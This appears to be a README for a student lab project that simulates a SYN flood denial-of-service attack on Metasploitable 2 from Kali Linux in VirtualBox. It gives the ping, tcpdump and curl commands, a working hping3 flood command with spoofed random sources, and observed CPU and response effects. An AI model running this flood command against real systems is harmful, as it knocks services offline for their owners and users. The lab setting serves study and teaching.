# DDOS-attack
DoS attack simulation using Kali Linux, Metasploitable 2, and hping3 for academic penetration testing research.


# Project Overview

This project demonstrates a simulated Denial of Service (DoS) attack in a controlled lab environment using Kali Linux and Metasploitable 2.

The purpose of the project is to understand:
- How SYN flood attacks work
- The impact of DoS attacks on system resources
- Network traffic monitoring techniques
- Basic penetration testing methodologies

---

# Technologies Used

- Kali Linux
- Metasploitable 2
- hping3
- tcpdump
- curl
- VirtualBox

---

# Lab Environment

| Machine | Purpose |
|---|---|
| Kali Linux | Attacker Machine |
| Metasploitable 2 | Victim Machine |
| VirtualBox | Virtualization Platform |

---

# Attack Type

## SYN Flood Attack

A SYN flood attack is a type of DoS attack where an attacker sends a large number of TCP SYN requests without completing the TCP handshake.

This causes:
- Half-open connections
- Resource exhaustion
- Slow server responses
- Potential service downtime

---

# Commands Used

## Verify Connectivity

```bash
ping 192.168.56.102

#Launch SYN Flood
sudo hping3 -S --flood --rand-source -p 80 192.168.56.102

Monitor Network Traffic
sudo tcpdump -i eth0 port 80

Test HTTP Response
time curl -I http://192.168.56.102

time curl -I --max-time 10 http://192.168.56.102

#Monitoring Results
#Before Attack
CPU idle approximately 92%
Minimal network activity
Fast HTTP response
#During Attack
CPU usage increased significantly
Large SYN packet flood detected
HTTP response became slow
Multiple half-open connections created
